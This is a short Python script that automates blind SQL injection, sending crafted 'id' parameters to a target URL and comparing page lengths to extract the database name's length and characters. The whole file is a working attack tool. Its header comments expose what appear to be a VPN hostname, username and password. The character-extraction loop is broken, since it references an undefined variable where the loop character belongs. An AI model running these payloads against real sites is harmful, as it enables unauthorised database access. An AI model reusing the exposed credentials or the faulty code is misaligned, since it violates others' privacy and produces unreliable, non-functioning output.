import requests
import sys
import string
#info:sslvpn.swjtu.edu.cn
#username:2016044855
#passwd:swjtu2022
url = sys.argv[1]
# url = "http://baidu.com"
htmllen = len(requests.get(url=url+"?id=1").text)
print("the len of html:"+str(htmllen))
dbnamelen = 0

while True:
    dbnamelen_url = url+"?id=1'+and+length(database())="+str(dbnamelen)+"--+"
    print(dbnamelen_url)

    if len(requests.get(dbnamelen_url).text) == htmllen:
        print("the len of dbname:"+str(dbnamelen))
        break

    if dbnamelen == 30:
        print("error!")
        break

    dbnamelen +=1

dbname=""

for i in range(1,dbnamelen+1):
    for char in string.ascii_lowercase:
        dbname_url = url+"?id=1'+and+substr(database(),"+str(i)+",1)="+a+"--+"
        print(dbname_url)
        if len(requests.get(dbname_url).text) == htmllen:
            dbname +=char
            print(dbname)
            break
